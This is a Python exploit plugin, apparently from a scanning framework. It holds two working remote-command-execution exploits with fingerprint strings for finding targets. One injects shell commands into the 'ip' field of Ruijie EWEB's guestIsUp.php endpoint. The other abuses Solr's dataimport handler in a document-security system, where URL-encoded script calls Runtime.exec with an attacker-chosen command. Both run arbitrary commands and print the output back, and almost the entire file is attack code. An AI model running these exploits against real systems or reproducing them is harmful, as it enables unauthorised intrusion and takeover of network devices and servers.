from util.ExpRequest import ExpRequest,Output
import util.globalvar as GlobalVar
import prettytable as pt
import re
"""
from ClassCongregation import Dnslog#通过Dnslog判断
DL = Dnslog() #申请dnslog地址
DL.dns_host() #返回dnslog地址
DL.result()   #判断
"""
class PeiQi():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo '+self.flag)
        self.linux_cmd = env.get('cmd', 'echo '+self.flag)
            
    def PeiQi_EWEB(self):
        appName = 'PeiQi'
        pocname = 'PeiQi_EWEB'
        path = '/guest_auth/guestIsUp.php'
        payload = "mac=1&ip=127.0.0.1| {} > PeiQi_test.txt"
        method = 'post'
        desc = 'PeiQi : PeiQi_EWEB'
        info = '[rce]'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)

        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url + path, data=payload.format("echo "+self.flag), headers=headers)
                r = exprequest.get(self.url + "/guest_auth/PeiQi_test.txt", headers=headers)
                if self.flag in r.text:
                    return output.echo_success(method, info)
                else:
                    return output.fail()
            else:
                r = exprequest.post(self.url + path, data=payload.format(self.cmd), headers=headers)
                r = exprequest.get(self.url + "/guest_auth/PeiQi_test.txt", headers=headers)
                print(r.text)
        except Exception as error:
            return output.error_output(str(error))

    def PeiQi_dataimport(self):
        appName = 'PeiQi'
        pocname = 'PeiQi_dataimport'
        path = '/solr/admin/cores'
        payload = {
            'stream.body': '''<?xml version="1.0" encoding="UTF-8"?>
            <RDF>
            <item/>
            </RDF>'''
        }
        method = 'post'
        desc = 'PeiQi : PeiQi_dataimport'
        info = '[rce]'
        headers = {"Content-Type": "application/x-www-form-urlencoded",}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)

        try:
            request = exprequest.get(self.url + path, headers=headers)
            if 'responseHeader' in request.text and request.status_code == 200:
                result = re.search(r'<str name="name">([\s\S]*?)</str><str name="instanceDir">', request.text, re.I)
                core_name = result.group(1)

                request = exprequest.post(self.url + "/solr/{}/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20".format(core_name, self.cmd), files=payload)
                cmd_response = re.search(r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', request.text, re.I)
                cmd_response = cmd_response.group(1)
                if request.status_code == 200 and cmd_response:
                    return output.echo_success(method, info)
                    print(cmd_response)
                else:
                    return output.fail()
            return output.fail()
        except Exception as error:
            return output.error_output(str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
tb.add_row(["PeiQi", "PeiQi_EWEB", "app=\"锐捷网络-EWEB网管系统\" , [rce]"])
tb.add_row(["PeiQi", "PeiQi_dataimport", "title=\"电子文档安全管理系统\" , [rce]"])
print(tb)

def check(**kwargs):
    thread_list = []
    ExpPeiQi = PeiQi(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpPeiQi, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(PeiQi):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpPeiQi, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)






